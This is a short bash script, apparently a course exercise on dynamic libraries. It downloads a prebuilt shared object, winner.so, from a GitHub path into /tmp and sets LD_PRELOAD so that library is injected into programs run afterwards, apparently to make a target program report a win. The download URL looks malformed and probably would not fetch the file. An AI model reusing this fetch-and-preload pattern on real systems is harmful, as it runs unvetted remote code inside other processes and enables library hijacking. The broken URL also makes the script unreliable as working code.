#!/bin/bash
wget -P /tmp/ https://github.com/gims-inc/alx-low_level_programming/master/0x18-dynamic_libraries/winner.so
export LD_PRELOAD=/tmp/winner.so
